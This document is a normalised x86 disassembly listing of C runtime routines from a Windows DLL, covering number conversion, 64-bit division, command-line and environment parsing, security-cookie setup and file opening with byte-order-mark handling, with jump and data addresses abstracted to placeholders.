movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_100164b0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10016518
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1001389d
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10015ac2
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10014440
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10014440
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_1000ced5
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10015ac2
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000ced5
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_100143d1
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d7be
add esp 0x14
sub_100165f6
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1001ac43
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1001ac43
pop ecx
test eax eax
je r-xdata
call sub_1001ac43
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_10016790
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1001389d
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_100165f6
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10015a7d
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_100165f6
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1001684b
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_10015a7d
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_10015a7d
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_100109a0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1000ced5
pop ecx
mov [ ebp - 0x4 ] ebx
sub_10016982
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100169a8
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100169ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10016a73
push 0x10
push r--data
call sub_1000ed24
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
sub_10016ad3
push 0x10
push r--data
call sub_1000ed24
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016b69
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1000ca66
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000ced5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_10016b72
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d7be
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_1001aecd
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_1000ecee
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1000ecdb
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_1000e70c
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1000ecee
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1000ecdb
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_1000ecdb
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1000ed01
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1000ed01
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_1000e4c7
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_1000e8a6
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_1000f742
add esp 0xc
test eax eax
jne r-xdata
call sub_1000ecee
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_1000e8a6
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_10010d05
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1000ed01
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_1000e548
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_1001ac5b
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_1000f742
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100178c8
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100178c8
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_10010d05
pop ecx
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_1000e8a6
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_10010723
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_1000e8a6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100178c8
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100178c8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_10017291
push 0x14
push r--data
call sub_1000ed24
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
